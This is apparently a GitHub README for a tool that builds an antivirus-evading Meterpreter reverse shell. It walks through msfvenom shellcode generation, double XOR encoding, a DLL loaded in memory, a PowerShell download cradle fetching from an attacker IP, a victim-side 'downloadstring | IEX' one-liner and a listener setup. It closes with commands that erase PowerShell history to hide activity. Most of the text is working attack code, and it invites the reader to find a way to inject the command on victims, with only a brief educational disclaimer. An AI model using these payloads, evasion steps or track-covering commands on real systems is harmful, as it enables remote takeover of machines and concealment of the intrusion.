# RS_meterpreter_bypass
Get a Meterpreter reverse_tcp shell and bypass AV.
These two C# programs are used to encode and create a .dll file from a starting metasploit xor encoded reverse_tcp payload.
        
- Generate your payload **#1**
- XOR encode your shell script  **#2**
- Create a DLL to inject into memory **#3**
- Create a Powershell script to download and execute the DLL in memory **#4**

# How to use
**#1** Fisrt of all: generate shellcode in C# format, and use msfvenom's built-in encoder xor_dynamic

        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f csharp -e x64/xor_dynamic

Take note of the *buf* variable showed in output.

**#2** Now we use our [_XOR_encoder_](https://github.com/marcoigorr/RS_meterpreter_bypass/blob/6e7cf2a56639a471bc8a45d42c06cf47eb2ff10d/XOR_encoder.cs), open this in a new console project on Visual Studio Community and build an executable solution.

- Remember to change the byte array *buf* with your version

Execute the exe with:
        
        .\XOR_encoder.exe

Take note of the output, it is your new double-encoded payload.

We have now a double XOR-encoded shellcode.

**#3** To actually bypass AV we will need a .dll to run in memory, not in disk. 

We will use [_Class1_](https://github.com/marcoigorr/RS_meterpreter_bypass/blob/6e7cf2a56639a471bc8a45d42c06cf47eb2ff10d/Class1.cs) which is used to execute our payload and also bypass heuristics control. So, after you have changed also here the *buf* with your new double-encoded payload, build the solution.

The output will be ClassLibrary1.dll, the payload.

Now we have the .dll, we can host it in a remote server or ourselves with the command below after we have inserted the .dll in /var/www/html/

        service apache2 start

**#4** Now we just need to execute the .dll in memory, so we do a .ps1 script to do that, we can name it *download_cradle.ps1* also also this needs to be placed in /var/www/html:

        $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.102/ClassLibrary1.dll')
        $assem = [System.Reflection.Assembly]::Load($data)
        $class = $assem.GetType("ClassLibrary1.Class1")
        $method = $class.GetMethod("Runner")
        $method.Invoke(0, $null)

This PowerShell script will download the DLL, load it directly into memory, and invoke Runner function of [_Class1_](https://github.com/marcoigorr/RS_meterpreter_bypass/blob/6e7cf2a56639a471bc8a45d42c06cf47eb2ff10d/Class1.cs).

## Victim machine

On victim's machine we will just neet do run this command, It donwloades the script hosted in a remote server and allocate into memory (AMSI just ignores it):

        (New-Object system.net.webclient).downloadstring('http://192.168.1.102/download_cradle.ps1') | IEX
        
## Attacker machine

We will need to start up the listener with *msfconsole* to catch anything that come through:

        > msfconsole
        > use exploit/multi/handler
        > set payload windows/x64/meterpreter/reverse_tcp
        > set LHOST 192.168.1.102
        > set LPORT 4444
        > exploit

Or we can use this shortcut:

        msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.1.102; set lport 4444; set ExitOnSession false; exploit -j"

Now we just wait for the victim to issue the command:
        
        (New-Object system.net.webclient).downloadstring('http://192.168.1.102/download_cradle.ps1') | IEX

Your job to find a way for injecting this command :)

# Useful informations
Powershell history can be found at:

        C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Or with the command...
        
        (Get-PSReadlineOption).HistorySavePath
        
You can delete it with:
        
        Remove-Item -path C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
        
This simple command will do everything:

         Remove-Item -path (Get-PSReadlineOption).HistorySavePath
    
The system will recreate the file as soon as we execute a new command, no worries.

# Credits
- purpl3f0x

# Disclaimer
All the techniques provided here are solely meant for educational purposes only. All of the techniques taught here are only meant to be used in a closed laboratory environment or in consent with a second party.
